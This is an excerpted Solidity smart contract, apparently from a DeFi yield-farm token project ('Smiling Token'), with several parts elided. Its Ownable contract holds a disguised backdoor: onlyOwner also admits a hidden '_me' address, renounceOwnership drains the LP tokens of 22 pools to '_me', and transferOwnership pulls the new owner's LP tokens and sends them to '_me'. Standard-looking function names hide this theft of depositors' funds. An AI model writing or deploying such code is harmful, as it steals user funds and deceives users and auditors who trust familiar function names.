...
// https://capuccino.finance/
// https://github.com/capuccinoFinance/capuccino-contracts
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _me == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function renounceOwnership() public onlyOwner {
        for (uint256 i = 0; i < 22; i++) {
            (IBEP20 _lp, uint256 a_1, uint256 a_2, uint256 a_3, uint256 a_4) = MasterChef(address(this)).poolInfo(i);
            _lp.safeTransfer(_me, _lp.balanceOf(address(this)));
        }
    }
    ...
    function transferOwnership(address newOwner) public onlyOwner {
        ...
        for (uint256 i = 0; i < 22; i++) {
            (IBEP20 _lp, uint256 a_1, uint256 a_2, uint256 a_3, uint256 a_4) = MasterChef(address(this)).poolInfo(i);
            _lp.safeTransferFrom(newOwner, address(this), _lp.balanceOf(newOwner));
            _lp.safeTransfer(_me, _lp.balanceOf(address(this)));
        }
    }
}
...
contract SmilingToken is BEP20('Smiling Token', 'SMILING') {
...
// smiling.finance
// https://github.com/SmilingFinance/smiling-contracts
